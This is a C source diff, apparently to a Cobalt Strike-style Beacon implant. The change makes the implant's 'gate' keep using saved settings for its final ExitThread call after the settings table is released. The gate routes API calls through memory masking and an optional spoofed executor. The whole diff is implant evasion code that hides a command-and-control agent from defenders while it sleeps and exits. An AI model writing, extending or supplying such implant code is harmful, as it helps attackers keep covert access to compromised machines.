@@ -81,6 +81,29 @@ static int           g_gate_busy;     /* re-entrancy guard (see gate_dispatch) *
 static int           g_gate_off;      /* BeaconDisableBeaconGate() */
 static int           g_gate_mask_off; /* BeaconDisableBeaconGateMasking() */
 
+/* The settings the gate reads, as of gate_exit_snapshot(). safe_exit()
+ * releases the settings table before ExitThread goes through the gate;
+ * read through these, the exit call is decided the same way as every
+ * call before it. */
+static int g_gate_snap;
+static int g_gate_snap_api, g_gate_snap_mode, g_gate_snap_nook, g_gate_snap_sleep;
+
+static int gs_api(void)   { return g_gate_snap ? g_gate_snap_api    : setting_int(SETTING_BEACON_GATE_API); }
+static int gs_mode(void)  { return g_gate_snap ? g_gate_snap_mode   : setting_int(SETTING_BEACON_GATE_MODE); }
+static int gs_nook(void)  { return g_gate_snap ? g_gate_snap_nook   : setting_int(SETTING_GARGLE_NOOK); }
+static int gs_sleep(void) { return g_gate_snap ? g_gate_snap_sleep  : setting_int(SETTING_SLEEPTIME); }
+
+void gate_exit_snapshot(void)
+{
+	if (g_gate_snap)
+		return;
+	g_gate_snap_api   = setting_int(SETTING_BEACON_GATE_API);
+	g_gate_snap_mode  = setting_int(SETTING_BEACON_GATE_MODE);
+	g_gate_snap_nook  = setting_int(SETTING_GARGLE_NOOK);
+	g_gate_snap_sleep = setting_int(SETTING_SLEEPTIME);
+	g_gate_snap = 1;
+}
+
 /* if an API hangs, the mask engine's watchdog unmasks after this and the
  * call just keeps running unmasked */
 #define GATE_MASK_WATCHDOG_MS 60000
@@ -90,8 +113,8 @@ static int           g_gate_mask_off; /* BeaconDisableBeaconGateMasking() */
 int gate_enabled(void)
 {
 	return g_gate_off == 0
-	    && (setting_int(SETTING_BEACON_GATE_API) != 0
-	    || setting_int(SETTING_BEACON_GATE_MODE) != 0);
+	    && (gs_api() != 0
+	    || gs_mode() != 0);
 }
 
 int gate_api_enabled(int api)
@@ -102,9 +125,9 @@ int gate_api_enabled(int api)
 #else
 	if (!gate_enabled())
 		return 0;
-	if (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_ALL)
+	if (gs_mode() & GATE_MODE_ALL)
 		return 1;
-	return (setting_int(SETTING_BEACON_GATE_API) & GATE_BIT(api)) != 0;
+	return (gs_api() & GATE_BIT(api)) != 0;
 #endif
 }
 
@@ -296,12 +319,12 @@ static int gate_mask_allowed(int api)
 	if (g_gate_mask_off || threadcount > 0)
 		return 0;
 	/* the gate mask is the sleep mask's job - no sleep mask, no gate mask */
-	if (setting_int(SETTING_GARGLE_NOOK) == 0)
+	if (gs_nook() == 0)
 		return 0;
 	/* interactive Beacon skips the mask: it would only spin CPU (manual
 	 * p.279). The one-shot exit is not interactive traffic - it keeps the
 	 * scrub. */
-	if (api != GATE_API_EXITTHREAD && setting_int(SETTING_SLEEPTIME) < 3000)
+	if (api != GATE_API_EXITTHREAD && gs_sleep() < 3000)
 		return 0;
 	return 1;
 }
@@ -360,7 +383,7 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 
 		/* the spoofed executor is opt-in (setting 97 bit 1); init failure
 		 * degrades to the next executor */
-		if (g_gate_spoof_ready == 0 && (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_SPOOF))
+		if (g_gate_spoof_ready == 0 && (gs_mode() & GATE_MODE_SPOOF))
 			gate_init_spoof();
 
 		if (g_gate_spoof_ready == 1) {
